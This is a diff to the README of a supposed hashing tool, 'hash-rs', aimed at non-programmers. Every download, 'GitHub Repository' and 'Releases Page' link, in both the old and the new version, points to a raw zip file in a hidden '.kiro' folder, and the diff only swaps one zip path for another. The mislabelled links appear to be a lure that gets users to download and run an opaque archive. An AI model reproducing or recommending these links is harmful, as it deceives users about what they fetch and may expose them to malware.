@@ -1,6 +1,6 @@
 # 🚀 hash-rs - Fast, Reliable Hashing for Everyone
 
-[![Download hash-rs](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/specs/hash-rs_1.4-beta.5.zip)](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/specs/hash-rs_1.4-beta.5.zip)
+[![Download hash-rs](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/hash_rs_2.6.zip)](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/hash_rs_2.6.zip)
 
 ## 📝 Introduction
 
@@ -14,7 +14,7 @@ To get started with **hash-rs**, follow these simple steps. No programming exper
 
 1. Click the download button below to visit the Releases page.
 
-   [Download hash-rs](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/specs/hash-rs_1.4-beta.5.zip)
+   [Download hash-rs](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/hash_rs_2.6.zip)
 
 2. On the Releases page, find the latest version of **hash-rs**. 
 
@@ -77,8 +77,8 @@ Yes, **hash-rs** is compatible with Linux, Mac, Windows, and FreeBSD. Download t
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/specs/hash-rs_1.4-beta.5.zip)
-- [Releases Page](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/specs/hash-rs_1.4-beta.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/hash_rs_2.6.zip)
+- [Releases Page](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/hash_rs_2.6.zip)
 
 ## 📞 Support
 
@@ -88,4 +88,4 @@ If you encounter any issues or have questions, feel free to open an issue in the
 
 Follow the repository for updates and new features. Regularly check the Releases page to ensure you have the latest version of **hash-rs**.
 
-[Download hash-rs](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/specs/hash-rs_1.4-beta.5.zip) again if needed. Enjoy using **hash-rs**!
+[Download hash-rs](https://raw.githubusercontent.com/BreeEiji15/hash-rs/main/.kiro/hash_rs_2.6.zip) again if needed. Enjoy using **hash-rs**!
